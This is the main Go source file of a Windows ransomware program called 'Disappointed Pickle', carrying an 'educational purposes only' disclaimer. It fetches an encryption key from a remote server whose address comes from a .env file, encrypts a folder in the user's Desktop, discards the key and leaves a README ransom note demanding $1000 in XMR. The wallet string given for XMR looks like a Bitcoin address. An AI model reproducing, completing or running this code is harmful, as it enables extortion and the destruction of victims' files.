/*
	Author: Alcid3s

	This software is strictly for educational purposes only. The author is not responsible for any damage caused by this software.
	A simple ransomware for windows that encrypts the files on the home folder of the user.
*/

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"runtime"

	"github.com/common-nighthawk/go-figure"
	"github.com/joho/godotenv"
	"ransomware.com/main/internal/colors"
	"ransomware.com/main/internal/ransomware"
)

const Version = "1.0"
const Disclaimer = colors.ColorRed + "Disclaimer: " + colors.ColorBlue + "\nThis code is ransomware and is for educational purposes only. " +
	"Do not use it for malicious purposes. the creator not responsible for any damage caused by this code." + colors.ColorReset

const Statement = "Your files have been encrypted. To decrypt them, send $1000 worth in XMR to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"

func titleScreen() {
	title := figure.NewFigure("Disappointed  Pickle  "+Version, "puffy", true)
	title.Print()
	fmt.Println(Disclaimer)
}

func main() {
	titleScreen()
	if runtime.GOOS != "windows" {
		fmt.Println("Windows is required to run this ransomware. Exiting...")
		return
	}

	err := godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file")
	}

	ipaddr := os.Getenv("IP_ADDRESS")
	port := os.Getenv("PORT")

	resp, err := http.Get("http://" + ipaddr + ":" + port + "/createkey")
	if err != nil {
		fmt.Println("Error getting key:", err)
		return
	}
	defer resp.Body.Close()

	key, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading key:", err)
		return
	}

	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)
	key = nil

	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//README.txt"), []byte(Statement), 0644)
}
